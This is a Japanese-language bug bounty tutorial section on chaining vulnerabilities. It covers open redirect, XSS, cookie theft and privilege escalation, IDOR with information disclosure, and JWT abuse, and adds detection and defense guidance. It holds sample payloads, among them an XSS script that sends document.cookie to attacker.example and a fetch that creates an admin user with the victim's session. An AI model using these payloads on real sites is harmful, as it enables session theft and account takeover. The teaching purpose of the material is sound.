## 脆弱性連鎖（Chaining）の基本パターン

### この節のねらい

あなたはすでに XSS・SSRF・IDOR・認証まわり・GraphQL など個々の「武器」を持っている。ここで扱うのは、それらを**どう束ねるか**という運用技術である。バグバウンティやペネトレーションテストで報奨額（および実務上のリスク評価）を決めるのは、単発の脆弱性の CVSS ではなく「最終的に攻撃者が何を達成できるか」というインパクトの物語だ。単独では Medium 止まりの欠陥でも、複数を連結すると Critical（例: 管理者アカウント乗っ取り＝ATO）に化ける。この「化けさせる」技術を**脆弱性連鎖（vulnerability chaining）**と呼ぶ。

まず用語を噛み砕く。

- **連鎖（chain）**: 複数の脆弱性を、前の欠陥の出力が次の欠陥の入力・前提条件になるように直列（ときに並列）につなぎ、単独では不可能なゴールに到達させる攻撃構成。
- **プリミティブ（primitive）**: 連鎖の一部品となる「できること」の最小単位。例:「任意の URL へリダイレクトさせられる」「任意の JS を被害者ブラウザで実行できる」「他人のオブジェクト ID を読める」など。連鎖とは、弱いプリミティブを組み合わせて強いプリミティブを合成していく作業だと考えるとよい。
- **sink（シンク）**: 入力が最終的に実行・解釈される危険な代入先。XSS なら `innerHTML` や `document.write`、SQLi なら SQL 文の連結箇所。
- **source（ソース）**: 攻撃者が制御できる入力の入口（URL パラメータ、フォーム、ヘッダ、API のボディなど）。
- **force multiplier（戦力倍増要因）**: それ単体では小さいが、他の欠陥と組むと影響を指数的に増幅する要素。後述の情報漏洩・IDOR がその典型。

この節では、代表的な 2 系統の基本パターン ——「クライアントサイド連鎖（Open Redirect → XSS → Cookie 窃取 → セッションハイジャック → 権限昇格）」と「サーバサイド／認可連鎖（情報漏洩 + IDOR、認証バイパス + 権限昇格）」—— を、**なぜその連鎖が成立するのかという仕組みレベル**まで掘り下げて解説する。最後に、連鎖を発見・整理するための思考フレームと、脆弱性タイプ別 writeup 集の使い方を示す。

> ⚠️ **本節のスコープ**: 本教科書は防御・学習目的で記述する。実在サービスや本番環境への無許可の検証、破壊的手順は書かない。以下のペイロード例はすべて、自分で管理するラボ環境や、明示的にスコープが与えられたバグバウンティ対象での挙動理解のためのものである。

### パターン1: クライアントサイド連鎖 — Open Redirect から権限昇格まで

最初の資料は、1 本のブログで「オープンリダイレクト → XSS → Cookie 窃取 → セッションハイジャック → 権限昇格」という王道の連鎖を通しで解説している。

>
> 検索で得られた要約によれば、この記事は OWASP Top 10 に沿って「低〜情報レベルの欠陥がどう Critical に昇華するか」を PoC 付きで示すものであり、具体的には (1) オープンリダイレクトで悪性リンクを踏ませ、(2) XSS で認証 Cookie や CSRF トークンを盗んで攻撃者に送信し、(3) 盗んだセッションで特権 API を叩く、という流れを扱う。アップロード制限のバイパスや、漏洩したパスを使ったアクションのトリガも紹介されている、とされる。

（以下は未取得資料の補足として、一般知識に基づく解説です。連鎖の各リンクがなぜ成立するのかを仕組みから説明する。）

#### リンク1: オープンリダイレクト — 「信頼されたドメイン」を運び屋にする

**オープンリダイレクト（open redirect）**とは、`https://victim.com/login?next=/dashboard` のような「リダイレクト先を URL パラメータで受け取る」機能で、遷移先を検証せず外部 URL まで飛ばしてしまう欠陥である。

```
https://victim.com/redirect?url=https://attacker.example/
```

サーバがこれを受けると、典型的には次のような応答を返す。

```
HTTP/1.1 302 Found
Location: https://attacker.example/
```

**なぜ危険か（仕組み）**: 単体のオープンリダイレクトは多くのプログラムで Low または Informational 扱いだ。実害は「フィッシングの踏み台になる」程度に見える。しかし連鎖の観点では、これは「**被害者に見せる URL のオリジンを victim.com のまま、実際の遷移先を攻撃者が制御できる**」という強力なプリミティブである。ユーザもメールフィルタも `victim.com` で始まる URL を信頼するため、次のリンク（XSS）へ被害者を運ぶ配送路として機能する。

多くの実戦の連鎖では、オープンリダイレクトは単なる配送路にとどまらず、**OAuth の `redirect_uri` 検証不備**や **XSS の起点**として直接効く。たとえば `javascript:` スキームへのリダイレクトを許すと、それ自体が XSS になる。

```
https://victim.com/redirect?url=javascript:alert(document.domain)
```

これがブラウザで実行されると、`victim.com` のコンテキストで JS が走る（＝リンク2 に直結する）。

#### リンク2: XSS — 被害者のオリジンで任意コードを実行する

**XSS（クロスサイトスクリプティング）**は、攻撃者の JavaScript を被害者のブラウザ上で、**被害者がログインしているオリジンのコンテキストで**実行させる欠陥。連鎖上の役割は「被害者ブラウザ内のあらゆる状態（Cookie、DOM、localStorage、進行中セッション）へのアクセス権を得ること」だ。

反射型 XSS のペイロード例（ラボ想定）:

```html
<script>
  // 被害者オリジンで実行される
  new Image().src = "https://attacker.example/c?d=" + encodeURIComponent(document.cookie);
</script>
```

**なぜ成立するか（仕組み）**: ブラウザの**同一オリジンポリシー（SOP）**は「あるオリジンの JS は別オリジンの DOM・Cookie にアクセスできない」という壁だが、XSS はこの壁の**内側**にコードを注入する。したがって注入コードは victim.com の一員として振る舞え、victim.com の Cookie（後述の `HttpOnly` でない分）や API に正規ユーザとしてアクセスできる。ここがオープンリダイレクト（外から誘導するだけ）との決定的な差である。

#### リンク3: Cookie 窃取 — HttpOnly の壁とその回避

Cookie 窃取は、上のペイポードのように `document.cookie` を外部へ送るのが基本。

**なぜ防御が効く/効かないか（仕組み）**: セッション Cookie に **`HttpOnly` 属性**が付いていると、JS からは `document.cookie` で読めなくなる。これは XSS からのセッション窃取に対する最も基本的な緩和だ。したがって、`HttpOnly` が付いている場合、攻撃者は Cookie を「盗む」のではなく、**被害者ブラウザを踏み台にして直接特権操作を実行する**方向に切り替える。

```html
<script>
  // Cookie は読めなくても、ブラウザは自動でCookieを付けてリクエストする
  fetch("https://victim.com/api/admin/create-user", {
    method: "POST",
    credentials: "include",             // 被害者のセッションCookieが自動付与される
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({user: "attacker", role: "admin"})
  });
</script>
```

ここで重要なのは、`credentials: "include"` によってブラウザが被害者の Cookie を自動付与する点だ。**`HttpOnly` は「JS が Cookie 値を読む」ことは防ぐが、「JS が Cookie 付きリクエストを送る」ことは防がない。** これが「Cookie を盗めなくても XSS で権限昇格できる」理由であり、初学者が誤解しやすい急所である。

#### リンク4→5: セッションハイジャックと権限昇格

盗んだ Cookie を攻撃者のブラウザに差し込めば（Cookie を復元すれば）、被害者としてログイン状態を再現できる（＝**セッションハイジャック**）。あとは被害者の権限で操作するだけだが、ここで**権限昇格**が加わると影響が跳ね上がる。

権限昇格が起きる典型的な仕組みは 2 つ:

1. **横方向（水平）→ 縦方向（垂直）への転換**: XSS ペイロードを「管理者が閲覧する画面」（例: 問い合わせ一覧、ユーザプロフィールのバイオ欄）に**保存型（stored）**で仕込む。すると発火するのは一般ユーザではなく管理者のセッションになり、盗めるのは管理者 Cookie になる。低権限アカウントから始めて高権限を奪う王道パターンだ。
2. **サーバ側の認可欠落**: 奪ったセッションで `/api/admin/*` を叩いたとき、サーバが「ログインしているか」しか確認せず「管理者か」を確認していなければ、そのまま特権 API が通る（次パターンの IDOR / BOLA と地続き）。

> 出典（検索要約による部分取得）: Chain Up Bugs — Web Application（Sakib Haque Zisan） — https://medium.com/@zisansakibhaque/chain-up-bugs-web-application-8a0b1d148e5b

**この連鎖の教訓**: Low 評価のオープンリダイレクト単体では数十ドル、あるいは Informational で報酬ゼロのこともある。しかし「配送路（Open Redirect）＋実行（XSS）＋窃取 or 直接操作＋認可欠落」を通しで示すと、同じ発見群が**アカウント乗っ取り＋権限昇格＝Critical** として一つのレポートに束ねられる。報奨最大化の本質は、個々の欠陥を別々に出すのではなく、**エンドツーエンドの攻撃シナリオとして実証する**ことにある。

### パターン2: サーバサイド／認可連鎖 — 情報漏洩 + IDOR、認証バイパス + 権限昇格

次の資料（Appsecure）は、SaaS の侵害を題材に、サーバサイドの認可系連鎖を体系立てて解説している。冒頭で連鎖をこう定義する。

> 「vulnerability chaining とは、複数のセキュリティ上の弱点を連結し、単一の脆弱性だけでは不可能なゴールを達成すること」

#### 具体例: 情報漏洩 + IDOR + 保存型 XSS の 3 段連鎖

資料が挙げる最も具体的な例が、**3 つの Medium 級を束ねて管理者乗っ取りに至る**ものだ。各段の CVSS は個別には中程度にすぎない点に注目したい。

| 段 | 脆弱性 | 個別 CVSS | できること |
|---|---|---|---|
| 1 | 情報漏洩 | 4.3 (Medium) | API が内部ユーザ ID を漏らす |
| 2 | IDOR | 5.3 (Medium) | プロフィール取得エンドポイントが認可チェックなしで任意 ID を受理 |
| 3 | 保存型 XSS | 6.1 (Medium) | プロフィールの bio 欄が未サニタイズの JS を実行 |

**連鎖後の結果**: 攻撃者はまず (1) でユーザ ID を大量収集し、(2) で管理者のプロフィールを特定・操作し、(3) で管理者のプロフィールに JS を仕込んで**管理者のセッショントークンを盗み、管理者権限を得る**。個別最大 6.1 の欠陥群が、連結すると管理者アカウント乗っ取り（実質 Critical）になる。

> 出典: Vulnerability Chaining Attacks in SaaS Breaches（Appsecure Security） — https://www.appsecure.security/blog/vulnerability-chaining-attacks-saas-breaches

#### なぜ CVSS 単体評価は連鎖を見落とすのか（仕組み）

CVSS（Common Vulnerability Scoring System）は、原則として**脆弱性を「孤立したもの」として評価する**設計だ。1 件の欠陥について「攻撃元区分」「必要権限」「必要な利用者関与」「機密性・完全性・可用性への影響」を採点する。しかし連鎖では、**前段の脆弱性が後段の前提条件（必要権限・攻撃前提）を満たしてしまう**。上表の例で言えば、IDOR 単体の CVSS は「攻撃者が有効なユーザ ID を知っている必要がある」という前提で減点されるが、情報漏洩がその前提を無料で提供するため、実際の攻撃難度は激減する。CVSS はこの「前提条件の相互供給」をモデル化できない。だから連鎖を扱う実務者は、CVSS の合計ではなく**「攻撃グラフ（attack graph）」全体の到達点**で影響を測る。

#### 「force multiplier」としての情報漏洩と IDOR

Appsecure は、連鎖の起点になりやすい 2 種を強調する。

**情報漏洩（information disclosure）が答える"攻撃者の質問"**:

- どのユーザ・リソースが存在するか（ユーザ列挙、UUID/ID の露出）
- どんなエンドポイントがあるか（未文書化 API、詳細なエラーメッセージ）
- 内部インフラはどうなっているか（スタックトレース、内部パス、スキーマの露出）

具体的な漏洩源として、詳細エラーメッセージ（内部パスやスキーマ露出）、ユーザ ID/リソース UUID を列挙する未認証 API、認証済みレスポンスを漏らす **CORS 設定ミス**、有効ユーザ名を暴くタイミング攻撃が挙げられている。これらは単体では「情報が漏れているだけ」で低評価だが、**偵察（recon）の役割を果たし、後続の欠陥の弾込めをする**。

**IDOR（Insecure Direct Object Reference）が戦力倍増する理由**: IDOR は「オブジェクト参照（`user_id`, `tenant_id` など）を改変すると、本来アクセス権のない他人のリソースにアクセスできる」欠陥。列挙データ（＝有効な ID のリスト）と組むと、攻撃能力が線形ではなく**指数的**に伸びる。資料が挙げる具体パターン:

- API パラメータ改変（`user_id`, `tenant_id` の書き換え）
- GraphQL の深いネストクエリによるフィールドアクセス
- ID 配列に対するバッチ操作の悪用（1 リクエストで大量の他人リソースを操作）
- カスケードアクセス（親リソースへのアクセスが、意図せず子リソースへのアクセスを付与）

#### もう一つの基本形: 認証バイパス + 権限昇格

資料の 2 つ目のパターンは「初期アカウント侵害 → ロール操作や JWT 悪用による権限昇格」。攻撃者はまず何らかの手段で足がかりのアカウントを得て、そこから権限を縦に伸ばす。弱点になりやすい箇所として次が列挙される。

- フロントエンドコードにハードコードされた **JWT シークレット**（→ 攻撃者が任意のトークンを自作できる）
- パスワードリセットトークンの予測可能性や有効期限欠如
- OAuth の `redirect_uri` 検証不備（パターン1のオープンリダイレクトと地続き）
- URL に載る API キー（ブラウザ履歴・プロキシログに残る）
- 認証エンドポイントのレート制限欠如（総当たり・OTP ブルートフォースを許す）
- ローテーションされないバックアップコードによる **MFA バイパス**

**JWT を例にした仕組み**: JWT（JSON Web Token）は `header.payload.signature` の 3 部からなり、`payload` にユーザ ID やロール（`"role":"user"`）が平文（Base64URL）で入る。改ざん防止は末尾の署名だけが担保する。もし署名鍵がフロントエンドに露出していれば、攻撃者は `"role":"admin"` に書き換えて正しい署名を付け直せる。これが「認証（本人であること）は突破していないのに、認可（権限）を昇格させる」典型だ。`alg: none` 受理や、HS256/RS256 の取り違え（公開鍵を HMAC 鍵として使わせる）も同系統の欠陥である。

#### 現実の侵害への対応（時事性の注記）

資料は次の実侵害を、連鎖の実例として参照している（いずれも報道ベースの概要で、細部は当時の各社発表を参照のこと）。

- **2024年 Okta 侵害**: サービスアカウントの設定ミスと特権アクセスの昇格を悪用。
- **Uber 侵害**: MFA 疲労（MFA fatigue、承認プッシュを連投して被害者に誤承認させる手口）＋特権クレデンシャルの露出の組み合わせ。
- **2023年 Mailchimp インシデント**: ソーシャルエンジニアリング＋不十分なセッション管理の連鎖。

これらは「単一の破壊的ゼロデイ」ではなく、**中程度の設定・運用不備を積み重ねた結果**であるという点で、本節のテーマそのものである。

#### 「連鎖しやすいアプリ」の検知指標（防御側の視点）

Appsecure は、連鎖に対して脆弱なアプリの兆候（detection indicators）を挙げている。バグハンターにとっては「狙い所のシグナル」、防御側にとっては「監査の着眼点」だ。

- 異なるリソース種別に **複数の IDOR** が存在する
- 情報漏洩と弱い認可が併存する
- エンドポイントごとに認可チェックが**一貫していない**
- 一般ユーザがアクセスできる**未文書化 API**がある
- セキュリティ上重要なオブジェクトに**連番 ID**が使われている

#### 防御アーキテクチャ（多層防御）

連鎖は「どこか 1 箇所を直せば全部止まる」ものではないため、防御も層で考える。資料が示す 4 層:

1. **偵察の阻止**: 未認証リクエストへの強めのレート制限（例: 10 req/min）、連番 ID ではなくランダム UUID、汎用的なエラーメッセージ（内部情報を漏らさない）。
2. **オブジェクト単位の認可**: データ取得の**前と後の両方**で認可チェックを行う。IDOR/BOLA を根絶する要。
3. **セグメンテーション**: マルチテナント分離、ネットワーク分離、サービス分離で「1 段抜かれても横に広がらない」構造にする（blast radius＝影響範囲の局所化）。
4. **振る舞い監視**: 速度（velocity）追跡、横移動検知、権限昇格シグナル、データアクセス異常の検知。

修正の優先順位付けも、純粋な CVSS 順ではなく「**連鎖の起点になり得るか（chain enablement）**」「増幅係数」「防御層上の位置」「blast radius」で評価すべきだと説く。だから「内部識別子の情報漏洩」や「非機微データに対する IDOR」のような一見低リスクの発見も、**連鎖の起点として高優先**に格上げされる。

### パターン別 writeup 集の使い方 — Awesome Bug Bounty Writeups

3 つ目の資料は、devanshbatham 氏らが維持する **脆弱性タイプ別の writeup キュレーション**（GitHub、約 6.1k stars）。連鎖の実例を「読んで盗む」ための一次資料集として使う。

**主なカテゴリ**（抜粋）: XSS（最大セクション、反射・保存・DOM・blind の 200 本超）、CSRF、Clickjacking/UI Redressing、LFI、サブドメインテイクオーバー、DoS、認証バイパス（OAuth・2FA 回避を含む）、SQLi、IDOR、CORS 設定ミス、SSRF（DNS rebinding 含む）、レースコンディション、RCE（最重要・多数）、バッファオーバーフロー、Android ペンテスト。

**連鎖として注目すべき収録例**（この節のテーマと直結）:

- Self-XSS ＋ UI redressing（クリックジャッキング）→ セッションハイジャック
- SSRF → ローカルファイル読み取り → **AWS メタデータ悪用**（クラウド認証情報の奪取）
- パストラバーサル ＋ ファイルアップロード → RCE
- CSRF ＋ SSRF → インフラ侵害
- レースコンディション → ビジネスロジック制約のバイパス

**この集の実務的な使い方**:

1. 各 writeup のタイトルには**バウンティ額**が付いていることが多い → 「どの連鎖がどれだけ評価されたか」を金額で逆引きし、自分の狙いを校正する。
2. **企業別セクション**（Google/Facebook/Microsoft/Yahoo）→ 大手プログラムの「効いた連鎖の型」を把握する。
3. 「self-XSS は単体では無価値」という定説を、UI redressing との連結で覆す例のように、**単体では報酬にならない欠陥を格上げする連結パターン**の在庫を増やす。

### まとめ: 連鎖を「発見・整理」するための思考フレーム

3 資料を総合すると、連鎖の基本パターンと、それを実務で回すための思考が浮かび上がる。

**基本パターンの型（暗記推奨）**:

| 型 | 連鎖 | 最終インパクト |
|---|---|---|
| クライアントサイド | Open Redirect → XSS → Cookie 窃取/直接操作 → セッションハイジャック → 権限昇格 | ATO・管理者乗っ取り |
| 認可連鎖 | 情報漏洩（ID 列挙）→ IDOR → 保存型 XSS | 管理者トークン窃取・ATO |
| 認証連鎖 | 初期侵害 → JWT 改ざん/ロール操作 → 権限昇格 | 垂直権限昇格 |
| クラウド波及 | SSRF → メタデータ窃取 → クラウド認証情報 | インフラ侵害 |
| ファイル系 | パストラバーサル ＋ ファイルアップロード | RCE |

**連鎖ハンティングの 4 つの問い**（各バグを見つけたら必ず自問する）:

1. **このバグの出力は、他のどのバグの入力（前提条件）になるか?**（例: 情報漏洩の ID → IDOR の弾）
2. **この XSS を「誰が」踏むか? 高権限ユーザに踏ませられないか?**（水平 → 垂直への転換）
3. **単体では前提条件（有効な ID・トークン・遷移先）が足りないバグに、その前提を供給できる別のバグはないか?**
4. **最終ゴール（ATO・RCE・テナント越境）から逆算して、足りないリンクは何か?**（attack graph を後ろから埋める）

**そして報奨・評価の原理**: CVSS の単純合計ではなく、**連鎖が到達する最終地点**で影響を語る。個々の Medium を別レポートに散らすのではなく、「情報漏洩 → IDOR → 保存型 XSS → 管理者 ATO」を 1 本のエンドツーエンド PoC として実証する。これが、同じ発見量でインパクト（と報奨、そして防御側にとっての正しい優先順位）を最大化する連鎖の核心である。
